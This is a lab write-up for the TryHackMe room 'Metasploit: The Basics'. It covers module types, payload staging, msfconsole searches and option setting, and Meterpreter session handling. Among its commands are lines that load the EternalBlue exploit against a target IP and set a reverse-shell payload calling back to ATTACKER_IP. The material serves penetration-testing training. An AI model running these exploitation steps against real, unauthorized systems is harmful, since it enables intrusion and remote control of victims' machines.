# TryHackMe — Metasploit: The Basics

| Field          | Details                                                                          |
|----------------|----------------------------------------------------------------------------------|
| **Platform**   | TryHackMe                                                                        |
| **Room**       | [Metasploit: The Basics](https://tryhackme.com/room/metasploitthebasics)         |
| **Difficulty** | Medium                                                                           |
| **OS**         | Windows                                                                          |
| **Category**   | Exploitation Framework, Post-Exploitation                                        |
| **Tags**       | Metasploit, msfconsole, Meterpreter, Payloads, Sessions                          |
| **Completed**  | June 2026                                                                        |

---

## Overview

This room covers the Metasploit Framework from the ground up — how it is structured, how to find and configure modules, and how to manage active sessions on compromised machines. Rather than just running a single exploit, this room builds the mental model needed to use Metasploit effectively across any engagement.

**Core skills practised:**
- Navigating msfconsole and searching for modules
- Understanding the seven module categories and payload types
- Configuring exploit parameters (RHOSTS, LHOST, PAYLOAD, SESSION)
- Managing Meterpreter and shell sessions
- Using `check` to verify vulnerability before exploiting

---

## Environment

- **Attacker machine:** TryHackMe AttackBox (in-browser Kali Linux)
- **Target machine:** TryHackMe-hosted Windows victim box
- **Connection:** TryHackMe VPN / in-browser lab

---

## Task 1 — Introduction to Metasploit

Metasploit is the most widely used open-source exploitation framework in penetration testing. Originally created by H.D. Moore in 2003, it was acquired by Rapid7 in 2009 and now contains over 2,600 exploits and 6,100+ modules.

It supports the full pentest lifecycle: recon → exploitation → post-exploitation → reporting.

**The three pillars of the framework:**

| Component    | What it does                                                                  |
|--------------|-------------------------------------------------------------------------------|
| `msfconsole` | The primary CLI — search modules, configure options, launch exploits, manage sessions |
| Modules      | Self-contained blocks of code, each performing a specific task                |
| Tools        | Standalone utilities like `msfvenom` for generating payloads outside msfconsole |

---

## Task 2 — Module Types and Payload Concepts

### The Seven Module Categories

| Category        | Purpose                                                              |
|-----------------|----------------------------------------------------------------------|
| Exploits        | Code that takes advantage of a specific vulnerability                |
| Auxiliary       | Scanners, fuzzers, and recon tools — no payload needed               |
| Payloads        | Code that runs on the target after exploitation                      |
| Post            | Post-exploitation modules (privilege escalation, pivoting, loot)     |
| Encoders        | Obfuscate payloads to evade AV/IDS signatures                        |
| NOPs            | No-operation instructions used for buffer padding in exploits        |
| Evasion         | More advanced AV/EDR bypass techniques                               |

### Payload Types Explained

Understanding payload types is critical — the wrong choice can break a working exploit.

**Singles (Inline)** — the entire payload is delivered in one package. Larger, but more reliable because there is no second-stage download that could fail.

**Stagers** — a tiny payload whose only job is to establish a communication channel back to the attacker. Once connected, it downloads the second component.

**Stages** — the full payload downloaded by the stager. Together, stager + stage = a staged payload. Smaller initial footprint, but requires a stable connection throughout.

> **How to tell them apart in Metasploit naming:**
> - `windows/x64/shell/reverse_tcp` → staged (the `/` between `shell` and `reverse_tcp`)
> - `windows/x64/shell_reverse_tcp` → single/inline (the `_` instead of `/`)

---

## Task 3 — Navigating msfconsole

### Launching Metasploit

```bash
msfconsole
```

### Searching for Modules

Basic search by keyword:

```bash
msf6 > search eternalblue
```

Filtered search — much more useful in practice:

```bash
msf6 > search type:exploit platform:windows cve:2017-0144
msf6 > search type:auxiliary platform:windows name:smb
```

Available filters: `type:`, `platform:`, `cve:`, `name:`

### Inspecting a Module

Before loading any module, always run `info` to check key fields:

```bash
msf6 > info exploit/windows/smb/ms17_010_eternalblue
# OR by index number after search:
msf6 > info 0
```

**Key fields to check in `info` output:**

| Field               | Why it matters                                                              |
|---------------------|-----------------------------------------------------------------------------|
| Privileged          | If `Yes`, a successful exploit gives SYSTEM/root — high value target        |
| Check supported     | If `Yes`, you can test vulnerability safely without firing the full exploit  |
| Available targets   | Some modules need specific Windows version selection to work correctly       |

---

## Task 4 — Configuring and Running Modules

### Loading a Module

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

### Viewing and Setting Options

```bash
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS <TARGET_IP>
msf6 exploit(...) > set LHOST <ATTACKER_IP>
msf6 exploit(...) > set LPORT 4444
```

### The Six Core Parameters

| Parameter | Meaning                                                                                  |
|-----------|------------------------------------------------------------------------------------------|
| RHOSTS    | Target IP(s). Accepts single IP, CIDR range, or a file (`file:/path/targets.txt`)        |
| RPORT     | Target port where the vulnerable service is running                                      |
| LHOST     | Your attacker machine IP — where the reverse connection calls back to                    |
| LPORT     | Port on your machine to receive the reverse connection (default: 4444)                   |
| PAYLOAD   | The payload to deliver — a default is pre-selected but can be overridden                 |
| SESSION   | For post-exploitation modules — specifies which active session to run through            |

### Local vs Global Parameters

```bash
# Local — only applies to the current module
msf6 exploit(...) > set RHOSTS 10.10.10.1

# Global — persists across all modules for the whole session
msf6 exploit(...) > setg RHOSTS 10.10.10.1

# Clear a single parameter
msf6 exploit(...) > unset RHOSTS

# Reset all parameters
msf6 exploit(...) > unset all
```

> Use `setg` when you are running multiple modules against the same target — saves you retyping RHOSTS and LHOST every time.

### Checking for Vulnerability Before Exploiting

```bash
msf6 exploit(...) > check
```

If supported, this probes the target without sending the exploit payload — important in real engagements where crashing a service is not acceptable.

### Switching Payloads

```bash
# See all compatible payloads for the current module
msf6 exploit(...) > show payloads

# Switch to a specific payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

### Running the Exploit

```bash
msf6 exploit(...) > exploit
# OR
msf6 exploit(...) > run
```

---

## Task 5 — Managing Sessions

### What Is a Session?

A session is an active communication channel between your machine and a compromised target. The type of session depends on which payload was used.

| Session Type        | Description                                                                    |
|---------------------|--------------------------------------------------------------------------------|
| Meterpreter         | Rich interactive environment — file system access, pivoting, privilege escalation |
| Shell               | Basic OS command line (cmd.exe on Windows, /bin/sh on Linux). Simpler, less capable |
| Protocol-specific   | For services like SMB, MSSQL, MySQL — used for targeted enumeration            |

### Session Commands

```bash
# Background the current session (keeps it alive)
CTRL + Z
# OR
meterpreter > background

# List all active sessions
msf6 > sessions

# Drop into a specific session
msf6 > sessions -i 1

# Kill a session
msf6 > sessions -k 1
```

> **Why backgrounding matters:** When you need to run a post-exploitation module (like `shell_to_meterpreter`), you background the current session first, load the post module, set `SESSION` to the right ID, then run it. This is the standard escalation workflow.

---

## Core Workflow Summary

```
msfconsole
     ↓
search [keyword / filters]
     ↓
info [module] → verify it fits the target
     ↓
use [module]
     ↓
show options → set RHOSTS, LHOST, PAYLOAD etc.
     ↓
check (if supported) → verify vulnerability safely
     ↓
exploit / run
     ↓
session established → background with CTRL+Z
     ↓
use post/[module] → set SESSION → run
```

---

## Tools Used

| Tool         | Purpose                                                        |
|--------------|----------------------------------------------------------------|
| msfconsole   | Primary Metasploit interface for all module operations         |
| msfvenom     | Standalone payload generator for use outside msfconsole        |
| Meterpreter  | Advanced post-exploitation shell with built-in commands        |

---

## Key Lessons Learned

1. **Module type determines your goal.** Exploits get you in, post modules keep you in and let you move deeper. Knowing the difference stops you wasting time loading the wrong thing.
2. **Staged vs single payloads is not just trivia.** In unstable network conditions, a staged payload can fail mid-download and lose your shell. Singles are safer when reliability matters more than size.
3. **`setg` saves time in multi-module engagements.** When running several modules against the same target, setting RHOSTS and LHOST globally means you never lose access by forgetting to re-set them.
4. **Always run `check` first when it's supported.** Firing an exploit at a patched system wastes time. On a real engagement, it could also crash a production service and alert the client.
5. **Sessions are reusable.** You don't need to re-exploit to run more post-exploitation modules — background the session, load the module, set SESSION, and run. This is the professional workflow.
6. **`info` before `use` is a habit worth building.** Checking `Privileged: Yes/No` and `Available targets` before loading tells you what you will get and whether you need to tune the module for a specific target version.

---

## References

- [TryHackMe — Metasploit: The Basics](https://tryhackme.com/room/metasploitthebasics)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Rapid7 Metasploit Modules](https://www.rapid7.com/db/)
- [Msfvenom Cheat Sheet](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
